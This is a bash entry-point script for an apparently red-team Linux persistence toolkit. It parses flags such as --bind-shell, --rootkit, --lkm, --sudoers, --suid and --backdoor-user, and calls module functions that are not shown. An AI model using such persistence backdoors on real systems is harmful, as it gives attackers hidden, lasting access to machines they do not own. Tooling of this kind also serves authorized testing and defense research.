# Only source modules dynamically if the script is executed directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    MODULES_DIR="$(dirname "${BASH_SOURCE[0]}")/modules"
    for module in "$MODULES_DIR"/*.sh; do
        if [[ -f $module ]]; then
            source "$module"
        fi
    done
fi

main() {
	local QUIET=0

	if [[ $# -eq 0 ]]; then
		if [[ $QUIET -ne 1 ]]; then
			print_banner
		fi
		if check_root; then
			usage_root
		else
			usage_user
		fi
		exit 0
	fi

	# Parse command line arguments
	while [[ "$1" != "" ]]; do
		case $1 in
			-q | --quiet )
				QUIET=1
				;;
			-h | --help )
				if check_root; then
					usage_root
				else
					usage_user
				fi
				exit
				;;
			--revert )
				shift
				revert_changes
				exit
				;;
			--at )
				shift
				setup_at "$@"
				exit
				;;
			--authorized-keys )
				shift
				setup_authorized_keys "$@"
				exit
				;;
			--backdoor-user )
				shift
				setup_backdoor_user "$@"
				exit
				;;
			--bind-shell )
				shift
				setup_bind_shell "$@"
				exit
				;;
			--cap )
				shift
				setup_cap_backdoor "$@"
				exit
				;;
			--create-user )
				shift
				setup_create_new_user "$@"
				exit
				;;
			--cron )
				shift
				setup_cron "$@"
				exit
				;;
			--generator )
				shift
				setup_generator_persistence "$@"
				exit
				;;
			--git )
				shift
				setup_git_persistence "$@"
				exit
				;;
			--initd )
				shift
				setup_initd_backdoor "$@"
				exit
				;;
			--lkm )
				shift
				setup_lkm_backdoor "$@"
				exit
				;;
			--malicious-container )
				shift
				setup_malicious_docker_container "$@"
				exit
				;;
			--malicious-package )
				shift
				setup_malicious_package "$@"
				exit
				;;
			--motd )
				shift
				setup_motd_backdoor "$@"
				exit
				;;
			--package-manager )
				shift
				setup_package_manager_persistence "$@"
				exit
				;;
			--passwd-user )
				shift
				setup_passwd_user "$@"
				exit
				;;
			--password-change )
				shift
				setup_password_change "$@"
				exit
				;;
			--rc-local )
				shift
				setup_rc_local_backdoor "$@"
				exit
				;;
			--rootkit )
				shift
				setup_rootkit "$@"
				exit
				;;
			--shell-profile )
				shift
				setup_shell_profile "$@"
				exit
				;;
			--ssh-key )
				shift
				setup_ssh_key "$@"
				exit
				;;
			--sudoers )
				shift
				setup_sudoers_backdoor "$@"
				exit
				;;
			--suid )
				shift
				setup_suid_backdoor "$@"
				exit
				;;
			--system-binary )
				shift
				setup_system_binary_backdoor "$@"
				exit
				;;
			--systemd )
				shift
				setup_systemd "$@"
				exit
				;;
			--udev )
				shift
				setup_udev "$@"
				exit
				;;
			--xdg )
				shift
				setup_xdg "$@"
				exit
				;;
			* )
				echo "Invalid option: $1"
				if check_root; then
					usage_root
				else
					usage_user
				fi
				exit 1
		esac
		shift
	done

	# Print banner unless in quiet mode
	if [[ $QUIET -ne 1 ]]; then
		print_banner
	fi

	# Show the usage menu if no specific command is given
	if check_root; then
		usage_root
	else
		usage_user
	fi
}

main "$@"
